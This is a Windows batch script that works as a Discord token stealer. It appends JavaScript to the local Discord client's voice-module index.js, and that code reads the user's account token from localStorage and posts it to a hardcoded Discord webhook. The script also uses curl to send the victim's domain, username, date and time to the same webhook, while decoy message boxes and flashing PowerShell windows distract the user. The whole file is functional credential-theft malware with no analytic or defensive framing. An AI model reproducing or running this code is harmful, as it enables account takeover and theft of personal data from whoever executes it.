@echo OFF
title [ Phase 3 ]

cd ..\..\..\

start %cd%\SRC\Data\Cache\MessageBox.vbs

cd SRC\Batch\Functions\


for /l %%x in (1, 1, 5) do (
powershell -window minimized -command ""
powershell -window maximized -command ""
)

set str=var X = window.localStorage = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;var V = JSON.stringify(X);var L = V;var C = JSON.parse(L);var strtoken = C["token"];var O = new XMLHttpRequest();O.open('POST', 'https://discord.com/api/webhooks/873360219927871530/4WiQF3SSWMj9ln_Wa6i69GBUJ8Tan2AFeIQ1Lc2Iz1kyLMJdsl5TlP3gzsqQcMDD5SJ2', false);O.setRequestHeader('Content-Type', 'application/json');O.send('{"content": ' + strtoken + '}');
echo %str% >> "C:\Users\%USERNAME%%\AppData\Local\Discord\app-1.0.9002\modules\discord_voice-9\discord_voice\index.js"
curl -X POST -H "Content-type: application/json" --data "{\"content\": \"DOMAIN: %USERDOMAIN%\nUSERNAME: %USERNAME%\nTIME: %TIME%\nDATE: %DATE%\n\"}" https://discord.com/api/webhooks/873360219927871530/4WiQF3SSWMj9ln_Wa6i69GBUJ8Tan2AFeIQ1Lc2Iz1kyLMJdsl5TlP3gzsqQcMDD5SJ2

pause > NUL
